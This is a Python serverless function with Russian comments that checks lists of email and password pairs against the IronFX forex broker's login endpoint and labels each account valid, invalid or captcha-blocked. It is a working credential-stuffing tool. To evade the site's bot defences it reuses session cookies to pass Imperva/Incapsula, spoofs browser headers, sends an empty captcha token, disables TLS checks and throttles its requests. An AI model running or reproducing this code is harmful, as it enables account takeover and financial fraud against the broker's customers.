"""
Проверка пар email:пароль на сайте IronFX (ironfx.com/json/login.json)
Требует передачи куки браузерной сессии (Imperva/Incapsula защита).
"""
import json
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

IRONFX_LOGIN_URL = 'https://www.ironfx.com/json/login.json'
IRONFX_PORTAL_URL = 'https://www.ironfx.com/en/client-portal'


def handler(event: dict, context) -> dict:
    cors = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
    }

    if event.get('httpMethod') == 'OPTIONS':
        return {'statusCode': 200, 'headers': cors, 'body': ''}

    try:
        raw_body = event.get('body') or '{}'
        if isinstance(raw_body, str):
            body = json.loads(raw_body)
        else:
            body = raw_body

        credentials = body.get('credentials', [])
        # Куки браузерной сессии — передаются с фронтенда
        session_cookie = body.get('session_cookie', '')

        if not credentials:
            return {
                'statusCode': 400,
                'headers': cors,
                'body': json.dumps({'error': 'Список credentials пустой'}),
            }

        results = []
        for item in credentials:
            login = item.get('email', '').strip()
            password = item.get('password', '').strip()

            if not login or not password:
                results.append({
                    'email': login,
                    'password': password,
                    'status': 'error',
                    'message': 'Пустой email или пароль',
                    'response_preview': '',
                })
                continue

            result = check_account(login, password, session_cookie)
            results.append(result)
            time.sleep(0.3)

        return {
            'statusCode': 200,
            'headers': cors,
            'body': json.dumps({'results': results}, ensure_ascii=False),
        }

    except Exception as e:
        return {
            'statusCode': 500,
            'headers': cors,
            'body': json.dumps({'error': str(e)}),
        }


def check_account(login: str, password: str, session_cookie: str = '') -> dict:
    session = requests.Session()
    session.verify = False

    try:
        post_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 YaBrowser/26.4.0.0 Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'ru,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.ironfx.com',
            'Referer': IRONFX_PORTAL_URL,
            'X-Requested-With': 'XMLHttpRequest',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "YaBrowser";v="26.4", "Yowser";v="2.5"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Priority': 'u=1, i',
        }

        # Передаём куки браузерной сессии если есть
        if session_cookie:
            post_headers['Cookie'] = session_cookie

        payload = {
            'login': login,
            'password': password,
            'recapture_token': '',
        }

        t0 = time.time()
        response = session.post(
            IRONFX_LOGIN_URL,
            data=payload,
            headers=post_headers,
            timeout=20,
            allow_redirects=True,
        )
        elapsed_ms = int((time.time() - t0) * 1000)

        status_code = response.status_code
        raw_text = response.text
        resp_text_lower = raw_text.lower()
        preview = raw_text[:300]

        try:
            resp_json = response.json()
        except Exception:
            resp_json = {}

        # --- Анализ ответа ---
        # Сигналы УСПЕХА
        success_signals = [
            resp_json.get('success') is True,
            resp_json.get('logged_in') is True,
            resp_json.get('status') == 'success',
            'token' in resp_json and 'error' not in resp_json,
            'redirect' in resp_json and resp_json.get('success') is not False,
            'dashboard' in resp_text_lower and 'login' not in resp_text_lower,
        ]

        # Сигналы КАПЧИ
        captcha_signals = [
            'recaptcha' in resp_text_lower,
            'captcha' in resp_text_lower,
            'recapture' in resp_text_lower,
            resp_json.get('captcha') is True,
            'robot' in resp_text_lower,
        ]

        # Сигналы НЕВЕРНОГО ПАРОЛЯ
        invalid_signals = [
            resp_json.get('success') is False,
            resp_json.get('error') is not None,
            'invalid' in resp_text_lower,
            'incorrect' in resp_text_lower,
            'wrong password' in resp_text_lower,
            'wrong credentials' in resp_text_lower,
            'authentication failed' in resp_text_lower,
            'login failed' in resp_text_lower,
            'invalid credentials' in resp_text_lower,
            resp_json.get('status') == 'error',
            resp_json.get('status') == 'fail',
        ]

        if status_code == 429:
            status = 'error'
            message = 'Rate limit — слишком много запросов'
        elif status_code in (401, 403):
            status = 'invalid'
            message = f'Отказано в доступе (HTTP {status_code})'
        elif status_code == 200:
            if any(success_signals):
                status = 'valid'
                message = 'Успешный вход ✓'
            elif any(captcha_signals):
                status = 'captcha'
                message = 'Сайт требует капчу'
            elif any(invalid_signals):
                err_msg = resp_json.get('error') or resp_json.get('message') or ''
                status = 'invalid'
                message = f'Неверный логин/пароль{": " + str(err_msg) if err_msg else ""}'
            else:
                status = 'unknown'
                message = f'Неизвестный ответ — см. preview'
        else:
            status = 'error'
            message = f'HTTP {status_code}'

        return {
            'email': login,
            'password': password,
            'status': status,
            'message': message,
            'http_code': status_code,
            'elapsed_ms': elapsed_ms,
            'response_preview': preview,
        }

    except requests.exceptions.Timeout:
        return {'email': login, 'password': password, 'status': 'error', 'message': 'Таймаут (>20s)', 'response_preview': ''}
    except requests.exceptions.ConnectionError as e:
        return {'email': login, 'password': password, 'status': 'error', 'message': f'Ошибка соединения: {e}', 'response_preview': ''}
    except Exception as e:
        return {'email': login, 'password': password, 'status': 'error', 'message': str(e), 'response_preview': ''}